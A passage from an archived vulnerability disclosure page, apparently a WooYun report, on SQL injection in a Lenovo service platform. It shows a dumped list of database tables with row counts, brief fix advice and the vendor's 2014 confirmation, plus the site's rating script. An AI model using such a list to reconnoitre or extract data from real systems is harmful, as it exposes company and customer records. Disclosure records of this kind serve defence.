+| dbo.FTP_Service_ErrorLog        | 2672    |<br />
+| dbo.BP_Warranty                 | 2066    |<br />
+| dbo.bp_warranty_bak20110406     | 2066    |<br />
+| dbo.CL_Claim                    | 1956    |<br />
+| dbo.SDF                         | 1914    |<br />
+| dbo.PMATTR                      | 1867    |<br />
+| dbo.CL_ClaimFeedback            | 1820    |<br />
+| dbo.CL_ClaimFeedback_20110322   | 1820    |<br />
+| dbo.SERVICE_SDF                 | 1584    |<br />
+| dbo.BP_Organization             | 1500    |<br />
+| dbo.CL_PayPricing               | 1435    |<br />
+| dbo.FTP_Service_ExcuteLog       | 1057    |<br />
+| dbo.PMRLTN                      | 798     |<br />
+| dbo.DI_ToStatmetrix             | 658     |<br />
+| dbo.DI_ECA                      | 507     |<br />
+| dbo.BP_ShipAddress              | 472     |<br />
+| dbo.PMCLSS                      | 464     |<br />
+| dbo.CL_ClaimPayment             | 463     |<br />
+| dbo.di_trainingcourse_temp      | 428     |<br />
+| dbo.BP_Product                  | 381     |<br />
+| dbo.SY_VALUE                    | 208     |<br />
+| dbo.sy_value_bak                | 206     |<br />
+| dbo.BP_RemitAddress             | 191     |<br />
+| dbo.di_mt_fru_temp              | 189     |<br />
+| dbo.TEMP_CUISY_2011             | 155     |<br />
+| dbo.DI_ToStatmetrix_temp        | 152     |<br />
+| dbo.CUISY_VALUE                 | 148     |<br />
+| dbo.TEMP_CUISY_VALUE            | 148     |<br />
+| dbo.SERVICE_CODE                | 111     |<br />
+| dbo.SY_ROLE_PRIVILEGE           | 70      |<br />
+| dbo.DI_PART_WTY                 | 67      |<br />
+| dbo.SY_State                    | 60      |<br />
+| dbo.DI_TrainingCourse           | 41      |<br />
+| dbo.SERVICE_MACHINE_SDF         | 40      |<br />
+| dbo.VW_SERVICE_MACHINE_SDF      | 40      |<br />
+| dbo.SY_PRIVILEGE                | 37      |<br />
+| dbo.SY_MarktingAttribut         | 23      |<br />
+| dbo.SY_ProdLine                 | 21      |<br />
+| dbo.bp_qual_condi               | 16      |<br />
+| dbo.PMLIBR                      | 16      |<br />
+| dbo.SY_CondType                 | 15      |<br />
+| dbo.SY_SERVICES_RELATION        | 14      |<br />
+| dbo.SY_Vendor_Prodline          | 11      |<br />
+| dbo.SY_Course                   | 10      |<br />
+| dbo.PMSEQN                      | 7       |<br />
+| dbo.SY_SEQ                      | 6       |<br />
+| dbo.BP_VRU_EXTRACT              | 5       |<br />
+| dbo.SY_ROLE                     | 5       |<br />
+| dbo.LOG_DTS_IBASE               | 4       |<br />
+| dbo.BP_Material_Vendor          | 3       |<br />
+| dbo.PMUSER                      | 3       |<br />
+| dbo.SY_Certification            | 3       |<br />
+| dbo.SY_Vendor_Payment           | 3       |<br />
+| dbo.SERVICE_SPLIT_SDF           | 2       |<br />
+| dbo.SY_PageBtn                  | 2       |<br />
+| dbo.PMBRNC                      | 1       |<br />
+| dbo.PMGUSR                      | 1       |<br />
+| dbo.PMOBJT                      | 1       |<br />
+| dbo.PMPERM                      | 1       |<br />
+| dbo.SY_InternalRole             | 1       |<br />
+| dbo.SY_InternalRole_MEMBER      | 1       |<br />
+| dbo.SY_InternalRole_PageBtn     | 1       |<br />
+| dbo.SY_PARAMS                   | 1       |<br />
++---------------------------------+---------+</code></pre><p class='detail'><br />
+<br />
+over  </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">已经证明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、过滤参数<br />
+<br />
+<br />
+<br />
+2、高RANK<br />
+<br />
+<br />
+<br />
+3、SSD快到碗里来 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Mr.leo" title="Mr.leo">Mr.leo</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-047186" title="联想某重要服务平台系统存在SQL注射导致信息泄露（多库）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-01-03 17:12</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对联想安全做出的贡献！我们将立即评估与修复相关漏洞</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="47186";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
